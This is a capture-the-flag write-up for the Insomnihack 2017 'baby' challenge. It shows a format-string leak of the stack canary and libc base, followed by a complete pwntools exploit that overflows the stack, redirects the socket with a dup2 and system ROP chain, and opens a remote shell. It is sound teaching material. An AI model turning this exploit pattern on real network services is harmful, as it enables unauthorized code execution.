# Insomnihack 2017 pwn 50 baby

This writeup is based off of: http://pastebinthehacker.blogspot.com/2017/01/insomnihack-2017-baby.html
Also I did not work on this challenge until a couple of years after the ctf, so I just solved it locally. In addition to that I just used a different copy of libc (included in this repo), and checked with a writeup to make sure it didn't impact the challenge greatly.

So we are given a libc file and a binary. Let's take a look at the binary:

```
$	file baby 
baby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, not stripped
$	pwn checksec baby 
[*] '/Hackery/insomnihack2017/baby/baby'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So we can see that it is a `64` bit elf, with a Stack Canary, Non Executable Stack, PIE, and RELRO. This binary is a server that listens on port `1337` spawns child processes. This becomes evident when we run the binary, and nothing appears to happen, along with code like this from the function `main`:

```
    fd = socket(2, 1, 6);
    if ( fd == -1 )
    {
      perror("socket");
      result = 1;
    }
    else
    {
      optval = 1;
      if ( setsockopt(fd, 1, 2, &optval, 4u) )
      {
        perror("setsockopt");
        result = 1;
      }
      else
      {
        addr.sa_family = 2;
        *(_DWORD *)&addr.sa_data[2] = htonl(0);
        *(_WORD *)&addr.sa_data[0] = htons(0x539u);
        if ( bind(fd, &addr, 0x10u) )
        {
          perror("bind");
          result = 1;
        }
```

in addition to that, we can see that it a new process is Listening on port `1337` (dead give away):

```
netstat -planet | grep 1337
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      0          152974      -  
```

So when we connect to the server, we see this:

```
$	nc 127.0.0.1 1337
Welcome to baby's first pwn.
Pick your favorite vuln : 
   1. Stack overflow
   2. Format string
   3. Heap Overflow
   4. Exit
Your choice > 
```

So we're given the choice between three seperate types of bugs.

#### Format String

So the first step is we are going to use the format string bug to get an infoleak. To start off with, we will need to debug the child process (since that is where the code we interface with runs). Due to the fact that it is a parent which spawns child processes, the process for debugging is a little bit different:

first launch the binary in gdb, set the values for `follow-fork-mode` and `detach-on-fork` to allow for debugging child processes, and run it:
```
$	sudo gdb ./baby 

.	.	.

gdb-peda$ set follow-fork-mode child
gdb-peda$ set detach-on-fork off
gdb-peda$ r
Starting program: /Hackery/insomnihack2017/baby/baby 
```

we can see here that there are no child processes:
```
gdb-peda$ info inferiors
  Num  Description       Executable        
* 1    process 12814     /Hackery/insomnihack2017/baby/baby 
gdb-peda$ c
Continuing.
```

next we will connect to the server:
```
$	 nc 127.0.0.1 1337
Welcome to baby's first pwn.
Pick your favorite vuln : 
   1. Stack overflow
   2. Format string
   3. Heap Overflow
   4. Exit
Your choice > 
```

we can see here that there is a child process. We will switch to it, and set a breakpoint for `dofmt+0x7f`:
```
[New process 12865]

.	.	.

gdb-peda$ info inferiors
  Num  Description       Executable        
  1    <null>            /Hackery/insomnihack2017/baby/baby 
* 2    process 12865     /Hackery/insomnihack2017/baby/baby 
gdb-peda$ set inferior 2
gdb-peda$ c
Continuing.
```

Now we will execute a format string attack to see what we can see what we can leak from the stack. We will be using the format string `%lx`, which will leak 8 byte values off of the stack (since it is a `64` bit binary). I just used python to generate a string with 150 `%lx.`:

```
Your format > %lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.
7fffffffe0f0.7ffff7af4154.0.0.0.400000000.0.25900000000.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.a.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.8e5.7ffff7b99377.7fffffffe480.5af2827ced9c5d00.0.0.ffffffffffffff80.400.7ffff7dd1ee0.1.7ffff7fd8440.7ffff7ac7a5a.2.555555555f09.555555758260.7fffffffe480.7fffffffe478.0.ffffffb0.7fffffffe4d0.ffffffffffffffb0.555555759970.7ffff77de090.5af2827ced9c5d00.0.400.7fffffffe530.5555555552e7.7ffff7dd1ee0.8e.555555555e30.555555555255.8e.2.7fffffffe520.45555535c.2.5af2827ced9c5d00.7fffffffe530.5555555559cf.555555554ff0.455555f09.a32.5af2827ced9c5d00.7fffffffe590.555555555bf0.7fffffffe678.100f0b5ff.1.155555c75.
``` 

and when we hit the breakpoint in gdb, we can see what the stack canary is. We know that it is at `rbp-0x8` for two seperate reasons. First off, this is the typical place the stack canary is at because it is the last value before we hit `rbp`. The second, is that in IDA we can see that the stack canary is at `rbp-0x8`:

```
__int64 __fastcall dofmt(int a1)
{
  int bytesRead; // [sp+1Ch] [bp-414h]@2
  char input[1032]; // [sp+20h] [bp-410h]@2
  __int64 canary; // [sp+428h] [bp-8h]@1
```

so we can just see the canary by looking at `rbp-0x8`:

```
Thread 2.1 "baby" hit Breakpoint 1, 0x0000555555555547 in dofmt ()
gdb-peda$ x/g $rbp-0x8
0x7fffffffe4f8:	0x5af2827ced9c5d00
```

So here we can see that the stack canary is `0x5af2827ced9c5d00`. We can see that we got this value from the infoleak, towards the end. So we can see what exact position it is at by issuing another format string:

```
Your format > %140$lx.%141$lx.%142$lx.%143$lx.%144$lx.%145$lx.%146$lx.%147$lx.%148$lx.%149$lx
5555555559cf.555555554ff0.455555f09.a32.5af2827ced9c5d00.7fffffffe590.555555555bf0.7fffffffe678.100f0b5ff.1
```

here we can see that the loation of the stack canary is at the offset `144`, so we can leak the stack canary with the format string `%144$lx`.


#### Buffer Overflow

This is the code for the Stack Overflow bug:

```
__int64 __fastcall dostack(int conn)
{
  int bytesRead; // ST1C_4@1
  __int64 result; // rax@1
  __int64 stackCheck; // rcx@1
  char buf; // [sp+20h] [bp-410h]@1
  __int64 stackCanary; // [sp+428h] [bp-8h]@1

  stackCanary = *MK_FP(__FS__, 40LL);
  sendstr((unsigned int)conn, "How much bytes you want to send ? ");
  recv(conn, &buf, 0xAuLL, 0);
  bytesRead = atoi(&buf);
  recvlen(conn, (__int64)&buf, bytesRead);
  sendstr((unsigned int)conn, "Good luck !\n");
  result = 0LL;
  stackCheck = *MK_FP(__FS__, 40LL) ^ stackCanary;
  return result;
```

We can see that the bug is it allows us to decide how much data get's scanned into `buf`. The space `buf` has is `0x408` or `1032` bytes. Immediately following that, we will reach the stack canary, so we will need to write over the stack canary with itself, otherwise it will detect stack smashing, and we won't get code exec. After that we will just have to write over `rbp` with `8` bytes so we will get to `rbp+0x8`, which with this architecture is where the return address is stored. So after we write `1032` bytes, followed by the stack canary, followed by `8` more bytes, we will be able to write over the return address and get code execution.

#### Additional Infoleaks

Now since  `PIE` (along with the other binary protections) is enabled, we will need an additional infoleak in order to know what address we need to jump to. A good place to start would be the format string bug we used to get the stack canary leak. First set a breakpoint for right after the format string bug at `dofmt+0xec`:

```
gdb-peda$ inferior 2
[Switching to inferior 2 [process 3103] (/Hackery/insomnihack17/baby/baby)]
[Switching to thread 2.1 (process 3103)]
#0  0x00007ffff7b06a1d in __libc_recv (fd=0x4, buf=0x7fffffffe4a0, len=0x2, flags=0x0)
    at ../sysdeps/unix/sysv/linux/recv.c:28
28  in ../sysdeps/unix/sysv/linux/recv.c
gdb-peda$ b *dofmt+0xec
Breakpoint 1 at 0x5555555555b4
gdb-peda$ c
Continuing.
```

then we trigger the breakpoint for the format string option with the input `15935728`:
```
Welcome to baby's first pwn.
Pick your favorite vuln : 
   1. Stack overflow
   2. Format string
   3. Heap Overflow
   4. Exit
Your choice > 2
Simply type '\n' to return
Your format > 15935728
15935728
```

Now that we are at the breakpoint, let's see where our input is stored:
```
gdb-peda$ find 15935728
Searching for '15935728' in: None ranges
Found 2 results, display max 2 items:
 [heap] : 0x55555575af30 ("15935728\n")
[stack] : 0x7fffffffe070 ("15935728\n")
```

this might be a bit of a pain, but we can use telescope to analyze this section of memory. It will essentially just look at a region of memory that we give it, and tell us about the data there (such as if it is a pointer to libc). Here we just look at 200 lines, starting at `0x7fffffffe070`.

```
gdb-peda$ telescope 0x7fffffffe070 200
```

just going through the input, we can see the stack canary here:

```
1032| 0x7fffffffe478 --> 0xf2f8acf6f7458300 
```

a little bit later, we can see a libc pointer to `__libc_start_main+231`:
```
1192| 0x7fffffffe518 --> 0x7ffff7a05b97 (<__libc_start_main+231>: mov    edi,eax)
```

We can see that it is 20 qwords infront of the stack canary (which is at offset `144`). So it should be around offset `160`. Let's use a format string bug to find out where:
```
Your format > %155$lx.%156$lx.%157$lx.%158$lx.%159$lx.%160$lx.%161$lx.%162$lx.%163$lx.%164$lx.%165$lx
7fffffffe5f0.f2f8acf6f7458300.555555555c30.7ffff7a05b97.2000000000.7fffffffe5f8.100000000.5555555559ff.0.675e72e97f8ad1cc.555555554ff0
```

Here we can see that the libc address offset is at `158`. We can leak it just like the stack canary, just change the offset. Also we can see that the offset to the start of the libc file I'm using is `0x21b97` by using the vmmap command, and since `0x7ffff7a05b97 - 0x00007ffff79e4000 = 0x21b97`:

```
gdb-peda$ vmmap
Start              End                Perm  Name
0x0000555555554000 0x0000555555557000 r-xp  /Hackery/insomnihack17/baby/baby
0x0000555555756000 0x0000555555757000 r--p  /Hackery/insomnihack17/baby/baby
0x0000555555757000 0x0000555555758000 rw-p  /Hackery/insomnihack17/baby/baby
0x0000555555758000 0x0000555555779000 rw-p  [heap]
0x00007ffff71a2000 0x00007ffff71ad000 r-xp  /lib/x86_64-linux-gnu/libnss_files-2.27.so
0x00007ffff71ad000 0x00007ffff73ac000 ---p  /lib/x86_64-linux-gnu/libnss_files-2.27.so
0x00007ffff73ac000 0x00007ffff73ad000 r--p  /lib/x86_64-linux-gnu/libnss_files-2.27.so
0x00007ffff73ad000 0x00007ffff73ae000 rw-p  /lib/x86_64-linux-gnu/libnss_files-2.27.so
0x00007ffff73ae000 0x00007ffff73b4000 rw-p  mapped
0x00007ffff73b4000 0x00007ffff73cb000 r-xp  /lib/x86_64-linux-gnu/libnsl-2.27.so
0x00007ffff73cb000 0x00007ffff75ca000 ---p  /lib/x86_64-linux-gnu/libnsl-2.27.so
0x00007ffff75ca000 0x00007ffff75cb000 r--p  /lib/x86_64-linux-gnu/libnsl-2.27.so
0x00007ffff75cb000 0x00007ffff75cc000 rw-p  /lib/x86_64-linux-gnu/libnsl-2.27.so
0x00007ffff75cc000 0x00007ffff75ce000 rw-p  mapped
0x00007ffff75ce000 0x00007ffff75d9000 r-xp  /lib/x86_64-linux-gnu/libnss_nis-2.27.so
0x00007ffff75d9000 0x00007ffff77d8000 ---p  /lib/x86_64-linux-gnu/libnss_nis-2.27.so
0x00007ffff77d8000 0x00007ffff77d9000 r--p  /lib/x86_64-linux-gnu/libnss_nis-2.27.so
0x00007ffff77d9000 0x00007ffff77da000 rw-p  /lib/x86_64-linux-gnu/libnss_nis-2.27.so
0x00007ffff77da000 0x00007ffff77e2000 r-xp  /lib/x86_64-linux-gnu/libnss_compat-2.27.so
0x00007ffff77e2000 0x00007ffff79e2000 ---p  /lib/x86_64-linux-gnu/libnss_compat-2.27.so
0x00007ffff79e2000 0x00007ffff79e3000 r--p  /lib/x86_64-linux-gnu/libnss_compat-2.27.so
0x00007ffff79e3000 0x00007ffff79e4000 rw-p  /lib/x86_64-linux-gnu/libnss_compat-2.27.so
0x00007ffff79e4000 0x00007ffff7bcb000 r-xp  /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bcb000 0x00007ffff7dcb000 ---p  /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcb000 0x00007ffff7dcf000 r--p  /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd1000 rw-p  /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dd1000 0x00007ffff7dd5000 rw-p  mapped
0x00007ffff7dd5000 0x00007ffff7dfc000 r-xp  /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7fdf000 0x00007ffff7fe1000 rw-p  mapped
0x00007ffff7ff7000 0x00007ffff7ffa000 r--p  [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp  [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p  /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p  /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p  mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p  [stack]
0xffffffffff600000 0xffffffffff601000 r-xp  [vsyscall]
```


#### ROP Chain

Now that we have a buffer overflow vuln where we can get code exec, a stack canary and libc infoleak, we can make a ROP chain to pop a shell. Since what we are attacking is a remote server, we will have to redirect output to us. I will do this using the `dup2` function, which essentially takes two file descriptors and makes the file opened by the first file descriptor also opened by the second file descriptor. STDIN, STDOUT, and STDERR are file descriptors 0, 1, and 2. The socket which the process uses to talk to us is seen as a file descriptor by the program. Looking in the proc folder, we can see that the file descripter for the socket is `4`:

```
# ps -aux | grep baby
root       3095  0.0  0.0  72716  4424 pts/1    S+   22:22   0:00 sudo gdb ./baby
root       3096  0.0  0.6 136308 55576 pts/1    S+   22:22   0:00 gdb ./baby
baby       3103  0.0  0.0  12972  2328 pts/1    t    22:22   0:00 /Hackery/insomnihack17/baby/baby
guyinat+   3321  0.0  0.0  21536  1112 pts/7    S+   23:24   0:00 grep --color=auto baby
# ls /proc/3103/fd
0  1  2  4
```

So in order to redirect `STDIN`, `STDOUT`, and `STDERR` to us we will need three dup2 calls `dup2(4, 0)`, `dup2(4, 1)`, `dup2(4, 2)`. However after that we can just call system. All in all our payload will look like this:

```
0: 1032 bytes of filler until stack canary
1: 8 byte stack canary
2: 8 bytes of filler until return address
```

followed by that, we have our rop chain (this was automatically generated by pwntools):

```
0x0000:   0x7ffff7a07e6a pop rsi; ret
0x0008:              0x0 [arg1] rsi = 0
0x0010:   0x7ffff7a0555f pop rdi; ret
0x0018:              0x4 [arg0] rdi = 4
0x0020:   0x7ffff7af49a0 dup2
0x0028:   0x7ffff7a07e6a pop rsi; ret
0x0030:              0x1 [arg1] rsi = 1
0x0038:   0x7ffff7a0555f pop rdi; ret
0x0040:              0x4 [arg0] rdi = 4
0x0048:   0x7ffff7af49a0 dup2
0x0050:   0x7ffff7a07e6a pop rsi; ret
0x0058:              0x2 [arg1] rsi = 2
0x0060:   0x7ffff7a0555f pop rdi; ret
0x0068:              0x4 [arg0] rdi = 4
0x0070:   0x7ffff7af49a0 dup2
0x0078:   0x7ffff7a0555f pop rdi; ret
0x0080:   0x7ffff7b97e9a [arg0] rdi = 140737349516954
0x0088:   0x7ffff7a33440 system
```

also I just used pwntool's built in automatic ROP chain building to do this.

#### exploit

putting it all together we get the following exploit:
```
from pwn import *

# This exploit is based off of: http://pastebinthehacker.blogspot.com/2017/01/insomnihack-2017-baby.html

# Establish the target, architecture, and the libc file
libc = elf.ELF('libc-2.27.so')
target = remote('127.0.0.1', 1337)
context.arch = 'amd64'

# Just a helper function to clear out text
def clearMenu():
        target.recvuntil("choice > ")

# Function to use format string bug to leak value at offset
def infoLeak(offset):
        target.sendline("2")
        target.recvuntil("Your format > ")
        target.sendline("%" + str(offset) + "$lx")
        leak = target.recvline().replace("\n", "")
        leak = int(leak, 16)
        log.info("The infoleak is: " + hex(leak))
        target.sendline("")
        clearMenu()
        return leak

# Sends payload to stack smash option
def smashStack(payload):
        target.sendline("1")
        target.recvuntil("How much bytes you want to send ? ")
        length = str(len(payload))
        target.sendline(length)
        target.sendline(payload)



# Clear the initial text
clearMenu()

# Get the stack canary leak
stackCanary = infoLeak(144)

# Get the libc infoleak, and calculate the base
libcLeak = infoLeak(158)
libcBase = libcLeak - 0x21b97
log.info("The base of libc is: " + hex(libcBase))

# Declare the base of libc
libc.address = libcBase

# Make the rop chain:
'''
0x0000:   0x7ffff7a07e6a pop rsi; ret
0x0008:              0x0 [arg1] rsi = 0
0x0010:   0x7ffff7a0555f pop rdi; ret
0x0018:              0x4 [arg0] rdi = 4
0x0020:   0x7ffff7af49a0 dup2
0x0028:   0x7ffff7a07e6a pop rsi; ret
0x0030:              0x1 [arg1] rsi = 1
0x0038:   0x7ffff7a0555f pop rdi; ret
0x0040:              0x4 [arg0] rdi = 4
0x0048:   0x7ffff7af49a0 dup2
0x0050:   0x7ffff7a07e6a pop rsi; ret
0x0058:              0x2 [arg1] rsi = 2
0x0060:   0x7ffff7a0555f pop rdi; ret
0x0068:              0x4 [arg0] rdi = 4
0x0070:   0x7ffff7af49a0 dup2
0x0078:   0x7ffff7a0555f pop rdi; ret
0x0080:   0x7ffff7b97e9a [arg0] rdi = 140737349516954
0x0088:   0x7ffff7a33440 system
'''
rop = ROP(libc)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.dup2(4, 2)
rop.system(list(libc.search("/bin/sh\x00"))[0])

print rop.dump()

# Form the payload, and send it
payload = "0"*1032 + p64(stackCanary) + "1"*8 + str(rop)
smashStack(payload)

# Drop to an interactive shell
target.interactive()
```

when we run it (with the exploit how it is, we have to start up the server seperately):

```
$ python exploit.py 
[*] '/Hackery/insomnihack17/baby/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 127.0.0.1 on port 1337: Done
[*] The infoleak is: 0xc762129b183d2900
[*] The infoleak is: 0x7ffff7a05b97
[*] The base of libc is: 0x7ffff79e4000
[*] Loaded cached gadgets for 'libc-2.27.so'
0x0000:   0x7ffff7a07e6a pop rsi; ret
0x0008:              0x0 [arg1] rsi = 0
0x0010:   0x7ffff7a0555f pop rdi; ret
0x0018:              0x4 [arg0] rdi = 4
0x0020:   0x7ffff7af49a0 dup2
0x0028:   0x7ffff7a07e6a pop rsi; ret
0x0030:              0x1 [arg1] rsi = 1
0x0038:   0x7ffff7a0555f pop rdi; ret
0x0040:              0x4 [arg0] rdi = 4
0x0048:   0x7ffff7af49a0 dup2
0x0050:   0x7ffff7a07e6a pop rsi; ret
0x0058:              0x2 [arg1] rsi = 2
0x0060:   0x7ffff7a0555f pop rdi; ret
0x0068:              0x4 [arg0] rdi = 4
0x0070:   0x7ffff7af49a0 dup2
0x0078:   0x7ffff7a0555f pop rdi; ret
0x0080:   0x7ffff7b97e9a [arg0] rdi = 140737349516954
0x0088:   0x7ffff7a33440 system
[*] Switching to interactive mode
Good luck !
$ w
 23:38:52 up  4:03,  1 user,  load average: 0.08, 0.05, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               19:36   ?xdm?   1:16   0.01s /usr/lib/gdm3/gdm-x-session --run-script
$ ls
examples.desktop
```

Just like that, we popped a shell!
